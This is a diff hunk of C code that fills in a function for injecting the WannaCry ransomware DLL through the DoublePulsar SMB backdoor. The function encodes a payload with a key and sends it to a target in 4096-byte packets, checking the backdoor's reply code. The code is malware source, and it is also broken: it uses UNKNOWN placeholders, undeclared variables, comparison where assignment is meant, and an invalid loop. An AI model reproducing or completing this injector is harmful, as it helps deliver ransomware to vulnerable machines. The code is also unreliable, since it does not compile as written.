@@ -115,7 +115,60 @@ int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
 
 int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
 {
-
+	int payload_size;	
+	if(architectureType)
+	{
+		//32 bits
+		//decimal: 4869
+		payload_size == 0x1305;
+	}
+	else
+	{
+		//64 bits
+		//decimal: 6144;
+		payload_size == 0x1800;
+	}
+	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, payload_size + 12 + v8);
+	memcpy(hMem + payload_size, UNKNOWN, UNKNOWN);
+	if(architectureType)
+	{
+		//
+	}
+	else
+	{
+		//
+	}
+	memcpy(hMem, UNKNOWN, UNKNOWN);
+	encodePacket(xkey, hMem, UNKNOWN);
+	memcpy(send_buffer, UNKNOWN, 70);
+	
+	v9 = total_size / 4096;
+	v10 = total_size % 4096;
+	
+	int ctx;
+	if(total_size / 4096 > 0)
+	{
+		for(i=0; ctx=i)
+		{
+			//loop through the packets
+			encodePacket(xkey, UNKNOWN, 12);
+			memcpy(send_buffer, (char *)hMem + ctx, 4096);
+			send(socket, (char*)send_buffer, 4178, 0);
+			recv(socket, (char*)recv_buffer, 4096, 0);
+			if(recvbuff[34] != 82)
+			{
+				//error, doublePulsar should return 82
+				break;
+			}
+			ctx += 4096;
+		}
+	}
+	
+	if ( v10 > 0 )
+	{
+		v25 = htons(v10+78);
+		encodePacket(xkey, session_parameters, 12);
+	}
 }
 
 int runPayloadOnTarget(char *host, u_short hostshort)
